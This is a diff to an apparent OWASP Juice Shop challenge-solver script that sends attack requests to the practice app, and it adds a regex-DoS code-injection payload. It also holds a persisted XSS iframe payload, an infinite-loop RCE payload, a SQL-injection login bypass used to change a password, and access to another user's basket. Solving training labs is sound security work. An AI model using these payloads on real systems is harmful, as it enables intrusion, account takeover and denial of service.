@@ -143,7 +143,7 @@ login=loads(requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.
 # ---- API-only XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)
 requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src="javascript:alert(`xss`)">','price':47.11}, headers={'Authorization':'Bearer '+login['token']})
 # ---- Blocked RCE DoS (Perform a Remote Code Execution that would keep a less hardened application busy forever.)
-requests.post(url+'/b2b/v2/orders', data={"orderLinesData": "(function dos() { while(true); })()"}, headers={'Authorization':'Bearer '+login['token']})
+requests.post(url+'/b2b/v2/orders', data={'orderLinesData':'(function dos() { while(true); })()'}, headers={'Authorization':'Bearer '+login['token']})
 # ---- Change Bender's Password (Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.)
 requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
 # ---- GDPR Data Theft (Steal someone else's personal data without using Injection.)
@@ -158,5 +158,7 @@ def sendRequest(specifiedUrl):
 from concurrent.futures import ThreadPoolExecutor
 with ThreadPoolExecutor(max_workers=4) as pool:
 	[x for x in pool.map(sendRequest,[url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews'])]
+# ---- Successful RCE DoS (Perform a Remote Code Execution that occupies the server for a while without using infinite loops.)
+requests.post(url+'/b2b/v2/orders', data={'orderLinesData':'/((a+)+)b/.test(\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\')'}, headers={'Authorization':'Bearer '+login['token']})
 # ---- View Basket (View another user's shopping basket.)
 requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
